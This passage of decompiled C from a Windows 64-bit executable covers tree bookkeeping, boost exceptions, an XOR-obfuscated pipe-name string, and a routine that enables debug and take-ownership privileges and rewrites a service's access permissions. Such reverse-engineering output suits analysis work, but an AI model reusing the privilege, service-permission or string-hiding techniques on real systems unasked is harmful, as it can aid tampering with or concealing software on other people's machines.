        v11 = v9;
        v12 = (__int64 *)*v9;
        if ( !*(_BYTE *)(*v9 + 25i64) )
        {
          do
          {
            v11 = v12;
            v12 = (__int64 *)*v12;
          }
          while ( !*((_BYTE *)v12 + 25) );
        }
      }
      *(_QWORD *)*v4 = v11;
    }
    a2 = (_QWORD *)*v4;
    if ( *(__int64 **)(*v4 + 16i64) == v5 )
    {
      if ( *((_BYTE *)v9 + 25) )
      {
        v13 = v10;
      }
      else
      {
        v13 = v9;
        for ( k = v9[2]; !*(_BYTE *)(k + 25); k = *(_QWORD *)(k + 16) )
          v13 = (__int64 *)k;
      }
      a2[2] = v13;
    }
    goto LABEL_45;
  }
  if ( *(_BYTE *)(v5[2] + 25) )
  {
    v9 = (_QWORD *)*v5;
    goto LABEL_15;
  }
  v9 = (_QWORD *)a3[2];
  if ( a3 == v5 )
    goto LABEL_15;
  *(_QWORD *)(*v5 + 8) = a3;
  *a3 = *v5;
  if ( a3 == (__int64 *)v5[2] )
  {
    v10 = a3;
  }
  else
  {
    v10 = (__int64 *)a3[1];
    if ( !*((_BYTE *)v9 + 25) )
      v9[1] = v10;
    *v10 = (__int64)v9;
    a3[2] = v5[2];
    *(_QWORD *)(v5[2] + 8) = a3;
  }
  if ( *(__int64 **)(*a1 + 8i64) == v5 )
  {
    *(_QWORD *)(*a1 + 8i64) = a3;
  }
  else
  {
    v15 = (__int64 **)v5[1];
    if ( *v15 == v5 )
      *v15 = a3;
    else
      v15[2] = a3;
  }
  a3[1] = v5[1];
  v16 = *((_BYTE *)a3 + 24);
  *((_BYTE *)a3 + 24) = *((_BYTE *)v5 + 24);
  *((_BYTE *)v5 + 24) = v16;
LABEL_45:
  if ( *((_BYTE *)v5 + 24) == 1 )
  {
    while ( 1 )
    {
      if ( v9 == *(_QWORD **)(*v4 + 8i64) || *((_BYTE *)v9 + 24) != 1 )
      {
LABEL_82:
        *((_BYTE *)v9 + 24) = 1;
        break;
      }
      v17 = (_BYTE *)*v10;
      if ( v9 == (_QWORD *)*v10 )
      {
        v17 = (_BYTE *)v10[2];
        if ( !v17[24] )
        {
          v17[24] = 1;
          *((_BYTE *)v10 + 24) = 0;
          v18 = (__int64 **)v10[2];
          v10[2] = (__int64)*v18;
          if ( !*((_BYTE *)*v18 + 25) )
            (*v18)[1] = (__int64)v10;
          v18[1] = (__int64 *)v10[1];
          if ( v10 == *(__int64 **)(*v4 + 8i64) )
          {
            *(_QWORD *)(*v4 + 8i64) = v18;
          }
          else
          {
            v19 = (__int64 **)v10[1];
            if ( v10 == *v19 )
              *v19 = (__int64 *)v18;
            else
              v19[2] = (__int64 *)v18;
          }
          *v18 = v10;
          v10[1] = (__int64)v18;
          v17 = (_BYTE *)v10[2];
        }
        if ( !v17[25] )
        {
          if ( *(_BYTE *)(*(_QWORD *)v17 + 24i64) != 1 || *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) != 1 )
          {
            if ( *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) == 1 )
            {
              *(_BYTE *)(*(_QWORD *)v17 + 24i64) = 1;
              v17[24] = 0;
              sub_14000C800((__int64)v4, v17);
              v17 = (_BYTE *)v10[2];
            }
            v17[24] = *((_BYTE *)v10 + 24);
            *((_BYTE *)v10 + 24) = 1;
            *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) = 1;
            sub_14001BF70((__int64)v4, (__int64)v10);
            goto LABEL_82;
          }
LABEL_74:
          v17[24] = 0;
          goto LABEL_75;
        }
      }
      else
      {
        if ( !v17[24] )
        {
          v17[24] = 1;
          *((_BYTE *)v10 + 24) = 0;
          v20 = *v10;
          *v10 = *(_QWORD *)(*v10 + 16);
          v21 = *(_QWORD *)(v20 + 16);
          if ( !*(_BYTE *)(v21 + 25) )
            *(_QWORD *)(v21 + 8) = v10;
          *(_QWORD *)(v20 + 8) = v10[1];
          if ( v10 == *(__int64 **)(*v4 + 8i64) )
          {
            *(_QWORD *)(*v4 + 8i64) = v20;
          }
          else
          {
            v22 = (_QWORD *)v10[1];
            if ( v10 == (__int64 *)v22[2] )
              v22[2] = v20;
            else
              *v22 = v20;
          }
          *(_QWORD *)(v20 + 16) = v10;
          v10[1] = v20;
          v17 = (_BYTE *)*v10;
        }
        if ( !v17[25] )
        {
          if ( *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) != 1 || *(_BYTE *)(*(_QWORD *)v17 + 24i64) != 1 )
          {
            if ( *(_BYTE *)(*(_QWORD *)v17 + 24i64) == 1 )
            {
              *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) = 1;
              v17[24] = 0;
              sub_14001BF70((__int64)v4, (__int64)v17);
              v17 = (_BYTE *)*v10;
            }
            v17[24] = *((_BYTE *)v10 + 24);
            *((_BYTE *)v10 + 24) = 1;
            *(_BYTE *)(*(_QWORD *)v17 + 24i64) = 1;
            sub_14000C800((__int64)v4, v10);
            goto LABEL_82;
          }
          goto LABEL_74;
        }
      }
LABEL_75:
      v9 = v10;
      v10 = (__int64 *)v10[1];
    }
  }
  v23 = (void **)(v5 + 4);
  v24 = (volatile signed __int32 *)v5[9];
  if ( v24 )
  {
    if ( !_InterlockedDecrement(v24 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *, _QWORD *, __int64 *))(*(_QWORD *)v24 + 8i64))(v24, a2, a3);
      if ( !_InterlockedDecrement(v24 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v24 + 16i64))(v24);
    }
  }
  if ( (unsigned __int64)v5[7] >= 0x10 )
    operator delete(*v23);
  v5[7] = 15i64;
  v5[6] = 0i64;
  *(_BYTE *)v23 = 0;
  operator delete(v5);
  v25 = v4[1];
  if ( v25 )
    v4[1] = v25 - 1;
  *v3 = v27;
  return v3;
}

//----- (00000001400139E0) ----------------------------------------------------
HANDLE __fastcall sub_1400139E0(__int64 a1)
{
  HANDLE result; // rax
  __int64 v2; // rbx
  HANDLE v3; // rdx
  signed __int64 v4; // rbx

  result = *(HANDLE *)(a1 + 8);
  v2 = a1;
  if ( !result )
  {
    v3 = sub_140013410(0, 0);
    v4 = _InterlockedCompareExchange((volatile signed __int64 *)(v2 + 8), (signed __int64)v3, 0i64);
    if ( v4 )
    {
      CloseHandle(v3);
      result = (HANDLE)v4;
    }
    else
    {
      result = v3;
    }
  }
  return result;
}

//----- (0000000140013A30) ----------------------------------------------------
__int64 __fastcall sub_140013A30(unsigned int *a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__fastcall **)(_QWORD, __int64, _QWORD))(**((_QWORD **)a1 + 1) + 16i64))(*((_QWORD *)a1 + 1), a2, *a1);
  return v2;
}

//----- (0000000140013A58) ----------------------------------------------------
void __fastcall __noreturn sub_140013A58(__int64 a1)
{
  sub_140013A70(a1 - *(signed int *)(a1 - 4));
}

//----- (0000000140013A70) ----------------------------------------------------
void __fastcall __noreturn sub_140013A70(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // r8
  __int64 v4; // rcx
  __int64 (__fastcall **v5)(void *); // [rsp+30h] [rbp-49h]
  __int128 v6; // [rsp+48h] [rbp-31h]
  char Dst; // [rsp+58h] [rbp-21h]
  __int64 v8; // [rsp+68h] [rbp-11h]
  __int64 v9; // [rsp+70h] [rbp-9h]
  void **v10; // [rsp+78h] [rbp-1h]
  __int64 v11; // [rsp+80h] [rbp+7h]
  __int64 v12; // [rsp+88h] [rbp+Fh]
  __int64 v13; // [rsp+90h] [rbp+17h]
  int v14; // [rsp+98h] [rbp+1Fh]
  int v15; // [rsp+9Ch] [rbp+23h]
  signed int *v16; // [rsp+A0h] [rbp+27h]
  void **v17; // [rsp+B0h] [rbp+37h]

  v1 = a1 - 128;
  v16 = (signed int *)&unk_1400A3D58;
  v17 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v5, (const struct std::exception *)(a1 - 128));
  v5 = (__int64 (__fastcall **)(void *))&loc_1400A3CD0;
  v6 = *(_OWORD *)(v1 + 24);
  v9 = 15i64;
  v8 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, (_QWORD *)(v1 + 40), 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v5 = (__int64 (__fastcall **)(void *))&loc_1400A3CD0;
  v10 = &off_1400A3CB0;
  v4 = *(_QWORD *)(v1 + 80);
  v11 = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64, __int64, __int64))(*(_QWORD *)v4 + 24i64))(v4, v2, v3);
  v12 = *(_QWORD *)(v1 + 88);
  v13 = *(_QWORD *)(v1 + 96);
  v14 = *(_DWORD *)(v1 + 104);
  v5 = &off_1400A3D28;
  v10 = (void **)off_1400A3D38;
  *(signed int **)((char *)&v16 + v16[1]) = (signed int *)&off_1400A3D40;
  *(int *)((char *)&v15 + v16[1]) = 0;
  CxxThrowException(
    &v5,
    &_TI9_AV__clone_impl_U__error_info_injector_Vthread_resource_error_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D28: using guessed type __int64 (__fastcall *off_1400A3D28)(void *);
// 1400A3D38: using guessed type __int64 (__fastcall *off_1400A3D38[2])();
// 1400A3D40: using guessed type __int64 (__fastcall *off_1400A3D40)();
// 1400D3240: using guessed type int _TI9_AV__clone_impl_U__error_info_injector_Vthread_resource_error_boost___exception_detail_boost___exception_detail_boost__;

//----- (0000000140013B98) ----------------------------------------------------
void __fastcall __noreturn sub_140013B98(__int64 a1, __int64 a2, __int64 a3)
{
  sub_140013BB0(a1 - *(signed int *)(a1 - 4), a2, a3);
}

//----- (0000000140013BB0) ----------------------------------------------------
void __fastcall __noreturn sub_140013BB0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rcx
  void **v5; // [rsp+28h] [rbp-60h]
  __int64 v6; // [rsp+30h] [rbp-58h]
  __int64 v7; // [rsp+38h] [rbp-50h]
  __int64 v8; // [rsp+40h] [rbp-48h]
  int v9; // [rsp+48h] [rbp-40h]
  __int64 (__fastcall **v10)(); // [rsp+50h] [rbp-38h]
  int v11; // [rsp+64h] [rbp-24h]
  signed int *v12; // [rsp+68h] [rbp-20h]
  void **v13; // [rsp+78h] [rbp-10h]

  v3 = a1;
  v12 = (signed int *)&unk_1400A3D90;
  v13 = &off_1400A3CB8;
  v5 = &off_1400A3CB0;
  v4 = *(_QWORD *)(a1 - 72);
  v6 = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64, __int64, __int64))(*(_QWORD *)v4 + 24i64))(v4, a2, a3);
  v7 = *(_QWORD *)(v3 - 64);
  v8 = *(_QWORD *)(v3 - 56);
  v9 = *(_DWORD *)(v3 - 48);
  std::exception::exception((std::exception *)&v10, (const struct std::exception *)(v3 - 40));
  v5 = (void **)&off_1400A3D60;
  v10 = &off_1400A3D68;
  *(signed int **)((char *)&v12 + v12[1]) = (signed int *)&off_1400A3D78;
  *(int *)((char *)&v11 + v12[1]) = 0;
  CxxThrowException(&v5, &_TI6_AV__clone_impl_Ubad_alloc__exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D60: using guessed type __int64 (__fastcall *off_1400A3D60)(void *);
// 1400A3D68: using guessed type __int64 (__fastcall *off_1400A3D68)();
// 1400A3D78: using guessed type __int64 (__fastcall *off_1400A3D78)();
// 1400D33F0: using guessed type int _TI6_AV__clone_impl_Ubad_alloc__exception_detail_boost___exception_detail_boost__;

//----- (0000000140013C84) ----------------------------------------------------
void __fastcall __noreturn sub_140013C84(__int64 a1, __int64 a2, __int64 a3)
{
  sub_140013C90(a1 - *(signed int *)(a1 - 4), a2, a3);
}

//----- (0000000140013C90) ----------------------------------------------------
void __fastcall __noreturn sub_140013C90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rcx
  void **v5; // [rsp+28h] [rbp-60h]
  __int64 v6; // [rsp+30h] [rbp-58h]
  __int64 v7; // [rsp+38h] [rbp-50h]
  __int64 v8; // [rsp+40h] [rbp-48h]
  int v9; // [rsp+48h] [rbp-40h]
  __int64 (__fastcall **v10)(); // [rsp+50h] [rbp-38h]
  int v11; // [rsp+64h] [rbp-24h]
  signed int *v12; // [rsp+68h] [rbp-20h]
  void **v13; // [rsp+78h] [rbp-10h]

  v3 = a1;
  v12 = (signed int *)&unk_1400A3EA0;
  v13 = &off_1400A3CB8;
  v5 = &off_1400A3CB0;
  v4 = *(_QWORD *)(a1 - 72);
  v6 = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64, __int64, __int64))(*(_QWORD *)v4 + 24i64))(v4, a2, a3);
  v7 = *(_QWORD *)(v3 - 64);
  v8 = *(_QWORD *)(v3 - 56);
  v9 = *(_DWORD *)(v3 - 48);
  std::exception::exception((std::exception *)&v10, (const struct std::exception *)(v3 - 40));
  v5 = (void **)&off_1400A3E70;
  v10 = &off_1400A3E78;
  *(signed int **)((char *)&v12 + v12[1]) = (signed int *)&off_1400A3E88;
  *(int *)((char *)&v11 + v12[1]) = 0;
  CxxThrowException(&v5, &_TI6_AV__clone_impl_Ubad_exception__exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3E70: using guessed type __int64 (__fastcall *off_1400A3E70)(void *);
// 1400A3E78: using guessed type __int64 (__fastcall *off_1400A3E78)();
// 1400A3E88: using guessed type __int64 (__fastcall *off_1400A3E88)();
// 1400D34C0: using guessed type int _TI6_AV__clone_impl_Ubad_exception__exception_detail_boost___exception_detail_boost__;

//----- (0000000140013D70) ----------------------------------------------------
_QWORD *__fastcall sub_140013D70(std::exception *a1)
{
  std::exception *v1; // rbx
  char *v2; // rax
  size_t v3; // r8
  _QWORD *v4; // rax
  _QWORD *result; // rax
  void *v6; // [rsp+30h] [rbp-38h]
  unsigned __int64 v7; // [rsp+48h] [rbp-20h]

  v1 = a1;
  if ( !*((_QWORD *)a1 + 7) )
  {
    v2 = (char *)std::exception::what(a1);
    if ( *v2 )
    {
      v3 = -1i64;
      do
        ++v3;
      while ( v2[v3] );
    }
    else
    {
      v3 = 0i64;
    }
    sub_140004F20((char *)v1 + 40, v2, v3);
    if ( *((_QWORD *)v1 + 7) )
      sub_140004CA0((char *)v1 + 40, ": ", 2ui64);
    v4 = (_QWORD *)sub_140013A30((unsigned int *)v1 + 6, (__int64)&v6);
    sub_140004B80((_QWORD *)v1 + 5, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    if ( v7 >= 0x10 )
      operator delete(v6);
  }
  result = (_QWORD *)((char *)v1 + 40);
  if ( *((_QWORD *)v1 + 8) >= 0x10ui64 )
    result = (_QWORD *)*result;
  return result;
}
// 140097747: using guessed type __int64 sub_140097747(void);
// 1400A1980: using guessed type const char *std::exception::what(std::exception *__hidden this);

//----- (0000000140013E60) ----------------------------------------------------
_BOOL8 __fastcall sub_140013E60(__int64 a1, void *a2)
{
  const CHAR *v2; // rax
  bool v3; // bl
  void *v5; // [rsp+28h] [rbp-30h]
  unsigned __int64 v6; // [rsp+40h] [rbp-18h]

  v2 = (const CHAR *)sub_1400054F0(a2, &v5);
  v3 = sub_140073D00(v2);
  if ( v6 >= 0x10 )
    operator delete(v5);
  return v3;
}

//----- (0000000140013EC0) ----------------------------------------------------
__int64 __fastcall sub_140013EC0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbx
  int v6; // ST20_4
  _QWORD *v7; // rax
  void *Src; // [rsp+30h] [rbp-48h]
  unsigned __int64 v10; // [rsp+48h] [rbp-30h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = 0;
  v7 = sub_140013F40(&Src);
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD *, int, signed __int64))(*(_QWORD *)(v5 + 8) + 8i64))(
    v5 + 8,
    v4,
    v3,
    v7,
    v6,
    -2i64);
  if ( v10 >= 0x10 )
    operator delete(Src);
  return v4;
}

//----- (0000000140013F40) ----------------------------------------------------
_QWORD *__fastcall sub_140013F40(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9CB0;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9CB0 & 1 )
  {
    v5 = byte_1400D9CAC;
  }
  else
  {
    v4 = 69069 * dword_1400D9CA4 + 1234567;
    v1 = dword_1400D9CB0 | 1;
    dword_1400D9CA4 = v4;
    dword_1400D9CB0 |= 1u;
    dword_1400D9C9C = HIWORD(dword_1400D9C9C) + 36969 * (unsigned __int16)dword_1400D9C9C;
    LOBYTE(v4) = (BYTE2(dword_1400D9CA8) + 80 * dword_1400D9CA8) ^ v4;
    dword_1400D9CA8 = HIWORD(dword_1400D9CA8) + 18000 * (unsigned __int16)dword_1400D9CA8;
    v5 = (((unsigned int)dword_1400D9CA0 >> 13) ^ 32 * dword_1400D9CA0 ^ dword_1400D9CA0) + v4;
    dword_1400D9CA0 ^= ((unsigned int)dword_1400D9CA0 >> 13) ^ 32 * (dword_1400D9CA0 ^ (dword_1400D9CA0 << 12));
    byte_1400D9CAC = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9CB0 = v1 | 2;
    byte_1400D9CB8[0] = v5 ^ 0x63;
    byte_1400D9CB9 = (v5 - 1) ^ 0x6F;
    byte_1400D9CBA = (v5 - 2) ^ 0x72;
    byte_1400D9CBB = (v5 - 3) ^ 0x65;
    byte_1400D9CBC = (v5 - 4) ^ 0x5F;
    byte_1400D9CBD = (v5 - 5) ^ 0x69;
    byte_1400D9CBE = (v5 - 6) ^ 0x70;
    byte_1400D9CBF = (v5 - 7) ^ 0x63;
    byte_1400D9CC0 = (v5 - 8) ^ 0x5F;
    byte_1400D9CC1 = (v5 - 9) ^ 0x70;
    byte_1400D9CC2 = (v5 - 10) ^ 0x69;
    byte_1400D9CC3 = (v5 - 11) ^ 0x70;
    byte_1400D9CC4 = (v5 - 12) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400D9CAC;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9CB8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400D9C9C: using guessed type int dword_1400D9C9C;
// 1400D9CA0: using guessed type int dword_1400D9CA0;
// 1400D9CA4: using guessed type int dword_1400D9CA4;
// 1400D9CA8: using guessed type int dword_1400D9CA8;
// 1400D9CAC: using guessed type char byte_1400D9CAC;
// 1400D9CB0: using guessed type int dword_1400D9CB0;
// 1400D9CB9: using guessed type char byte_1400D9CB9;
// 1400D9CBA: using guessed type char byte_1400D9CBA;
// 1400D9CBB: using guessed type char byte_1400D9CBB;
// 1400D9CBC: using guessed type char byte_1400D9CBC;
// 1400D9CBD: using guessed type char byte_1400D9CBD;
// 1400D9CBE: using guessed type char byte_1400D9CBE;
// 1400D9CBF: using guessed type char byte_1400D9CBF;
// 1400D9CC0: using guessed type char byte_1400D9CC0;
// 1400D9CC1: using guessed type char byte_1400D9CC1;
// 1400D9CC2: using guessed type char byte_1400D9CC2;
// 1400D9CC3: using guessed type char byte_1400D9CC3;
// 1400D9CC4: using guessed type char byte_1400D9CC4;

//----- (0000000140014150) ----------------------------------------------------
__int64 __fastcall sub_140014150(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbx
  int v6; // ST20_4
  _QWORD *v7; // rax
  void *Src; // [rsp+30h] [rbp-48h]
  unsigned __int64 v10; // [rsp+48h] [rbp-30h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = 0;
  v7 = sub_140013F40(&Src);
  (*(void (__fastcall **)(__int64, __int64, __int64, _QWORD *, int, signed __int64))(*(_QWORD *)(v5 + 8) + 16i64))(
    v5 + 8,
    v4,
    v3,
    v7,
    v6,
    -2i64);
  if ( v10 >= 0x10 )
    operator delete(Src);
  return v4;
}

//----- (00000001400141D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400141D0(_QWORD *a1, const wchar_t *a2)
{
  _QWORD *v2; // rbx
  wchar_t *v3; // rcx

  v2 = a1;
  *a1 = off_1400A4018;
  v3 = (wchar_t *)(a1 + 1);
  *v3 = 0;
  if ( a2 )
    wcscpy_s(v3, 0x32ui64, a2);
  return v2;
}
// 1400A4018: using guessed type __int64 (__fastcall *off_1400A4018[2])();

//----- (0000000140014220) ----------------------------------------------------
_BOOL8 __fastcall sub_140014220(__int64 a1, __int64 *a2)
{
  __int64 *v2; // rsi
  __int64 v3; // r14
  bool v4; // di
  HANDLE v5; // rax
  HANDLE v6; // rbx
  HANDLE v7; // rbx
  __int64 i; // rbx
  const wchar_t *v9; // rax
  SC_HANDLE v10; // rax
  SC_HANDLE v11; // rbx
  const WCHAR *v12; // r14
  SC_HANDLE v13; // rax
  SC_HANDLE v14; // rsi
  SC_HANDLE v15; // rsi
  SC_HANDLE v16; // rax
  SC_HANDLE v17; // rsi
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [rsp+38h] [rbp-450h]
  HANDLE TokenHandle; // [rsp+40h] [rbp-448h]
  struct _LUID Luid; // [rsp+48h] [rbp-440h]
  __int64 v22; // [rsp+50h] [rbp-438h]
  struct _TOKEN_PRIVILEGES NewState; // [rsp+58h] [rbp-430h]
  WCHAR StringSecurityDescriptor[4]; // [rsp+70h] [rbp-418h]
  int v25; // [rsp+78h] [rbp-410h]
  __int16 v26; // [rsp+7Ch] [rbp-40Ch]
  char Dst; // [rsp+7Eh] [rbp-40Ah]

  v22 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = 0;
  SecurityDescriptor = 0i64;
  TokenHandle = 0i64;
  v5 = GetCurrentProcess();
  if ( OpenProcessToken(v5, 0xF01FFu, &TokenHandle) == 1 )
  {
    v6 = TokenHandle;
    if ( LookupPrivilegeValueW(0i64, L"SeDebugPrivilege", &Luid) )
    {
      NewState.PrivilegeCount = 1;
      NewState.Privileges[0].Luid = Luid;
      NewState.Privileges[0].Attributes = 2;
      if ( AdjustTokenPrivileges(v6, 0, &NewState, 0x10u, 0i64, 0i64) )
        GetLastError();
    }
    v7 = TokenHandle;
    if ( LookupPrivilegeValueW(0i64, L"SeTakeOwnershipPrivilege", &Luid) )
    {
      NewState.PrivilegeCount = 1;
      NewState.Privileges[0].Luid = Luid;
      NewState.Privileges[0].Attributes = 2;
      if ( AdjustTokenPrivileges(v7, 0, &NewState, 0x10u, 0i64, 0i64) )
        GetLastError();
    }
  }
  *(_QWORD *)StringSecurityDescriptor = 18296156957835343i64;
  v25 = 3801156;
  v26 = 0;
  memset(&Dst, 0, 0x3DAui64);
  for ( i = *v2; i != v2[1]; i += 216i64 )
  {
    v9 = (const wchar_t *)sub_14002B800(i);
    wcscat_s(StringSecurityDescriptor, 0x1F4ui64, v9);
  }
  ConvertStringSecurityDescriptorToSecurityDescriptorW(StringSecurityDescriptor, 1u, &SecurityDescriptor, 0i64);
  v10 = OpenSCManagerW(0i64, 0i64, 0xF003Fu);
  v11 = v10;
  if ( v10 )
  {
    v12 = (const WCHAR *)(v3 + 8);
    v13 = OpenServiceW(v10, v12, 0x40000u);
    v14 = v13;
    if ( v13 )
    {
      v4 = SetServiceObjectSecurity(v13, 4u, SecurityDescriptor) != 0;
      CloseServiceHandle(v14);
    }
    else
    {
      v15 = OpenServiceW(v11, v12, 0x80000u);
      if ( v15 )
      {
        SetLastError(0);
        v4 = SetServiceObjectSecurity(v15, 1u, SecurityDescriptor) != 0;
        CloseServiceHandle(v15);
        v16 = OpenServiceW(v11, v12, 0x40000u);
        v17 = v16;
        if ( v16 )
        {
          v4 = SetServiceObjectSecurity(v16, 4u, SecurityDescriptor) != 0;
          CloseServiceHandle(v17);
        }
      }
    }
    CloseServiceHandle(v11);
  }
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  LocalFree(SecurityDescriptor);
  return v4;
}

//----- (0000000140014520) ----------------------------------------------------
_OWORD *__fastcall sub_140014520(__int64 a1, __int64 a2, _OWORD *a3)
{
  __int64 i; // r9
  _OWORD *v4; // rcx

  for ( i = a1; i != a2; i += 216i64 )
  {
    if ( a3 )
    {
      *a3 = *(_OWORD *)i;
      a3[1] = *(_OWORD *)(i + 16);
      a3[2] = *(_OWORD *)(i + 32);
      a3[3] = *(_OWORD *)(i + 48);
      a3[4] = *(_OWORD *)(i + 64);
      a3[5] = *(_OWORD *)(i + 80);
      a3[6] = *(_OWORD *)(i + 96);
      v4 = a3 + 8;
      *(v4 - 1) = *(_OWORD *)(i + 112);
      *v4 = *(_OWORD *)(i + 128);
      v4[1] = *(_OWORD *)(i + 144);
      v4[2] = *(_OWORD *)(i + 160);
      v4[3] = *(_OWORD *)(i + 176);
      v4[4] = *(_OWORD *)(i + 192);
      *((_QWORD *)v4 + 10) = *(_QWORD *)(i + 208);
    }
    a3 = (_OWORD *)((char *)a3 + 216);
  }
  return a3;
}

//----- (0000000140014600) ----------------------------------------------------
void __fastcall sub_140014600(__int64 *a1)
{
  __int64 *v1; // rbx
  char v2; // [rsp+20h] [rbp-478h]
  char v3; // [rsp+100h] [rbp-398h]
  char v4; // [rsp+1E0h] [rbp-2B8h]
  char v5; // [rsp+2C0h] [rbp-1D8h]
  char v6; // [rsp+3A0h] [rbp-F8h]

  v1 = a1;
  sub_14002B7D0((__int64)&v3, (__int64)L"BU", -1610612736, 0);
  sub_140014A20(v1, (__int128 *)&v3);
  sub_14002B7D0((__int64)&v5, (__int64)L"PU", -1610612736, 0);
  sub_140014A20(v1, (__int128 *)&v5);
  sub_14002B7D0((__int64)&v2, (__int64)L"SY", 0x10000000, 0);
  sub_140014A20(v1, (__int128 *)&v2);
  sub_14002B7D0((__int64)&v4, (__int64)L"CO", 0x10000000, 0);
  sub_140014A20(v1, (__int128 *)&v4);
  sub_14002B7D0((__int64)&v6, (__int64)L"BA", 0x10000000, 0);
  sub_140014A20(v1, (__int128 *)&v6);
}
// 1400A40E8: using guessed type wchar_t aBu[3];
// 1400A40F0: using guessed type wchar_t aPu[3];
// 1400A40F8: using guessed type wchar_t aSy[3];
// 1400A4100: using guessed type wchar_t aCo[3];
// 1400A4108: using guessed type wchar_t aBa[3];

//----- (0000000140014720) ----------------------------------------------------
void __fastcall sub_140014720(__int64 *a1)
{
  __int64 *v1; // rbx
  char v2; // [rsp+20h] [rbp-478h]
  char v3; // [rsp+100h] [rbp-398h]
  char v4; // [rsp+1E0h] [rbp-2B8h]
  char v5; // [rsp+2C0h] [rbp-1D8h]
  char v6; // [rsp+3A0h] [rbp-F8h]

  v1 = a1;
  sub_14002B7D0((__int64)&v3, (__int64)L"BU", -1610612736, 0);
  sub_140014A20(v1, (__int128 *)&v3);
  sub_14002B7D0((__int64)&v5, (__int64)L"PU", -1610612736, 0);
  sub_140014A20(v1, (__int128 *)&v5);
  sub_14002B7D0((__int64)&v2, (__int64)L"SY", 983551, 0);
  sub_140014A20(v1, (__int128 *)&v2);
  sub_14002B7D0((__int64)&v4, (__int64)L"CO", -1610612736, 0);
  sub_140014A20(v1, (__int128 *)&v4);
  sub_14002B7D0((__int64)&v6, (__int64)L"BA", -1610612736, 0);
  sub_140014A20(v1, (__int128 *)&v6);
}
// 1400A40E8: using guessed type wchar_t aBu[3];
// 1400A40F0: using guessed type wchar_t aPu[3];
// 1400A40F8: using guessed type wchar_t aSy[3];
// 1400A4100: using guessed type wchar_t aCo[3];
// 1400A4108: using guessed type wchar_t aBa[3];

//----- (0000000140014840) ----------------------------------------------------
unsigned __int64 __fastcall sub_140014840(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  unsigned __int64 v3; // rdx
  unsigned __int64 v4; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = a2;
  v3 = ((unsigned __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)341606371735362067i64) >> 64) >> 63)
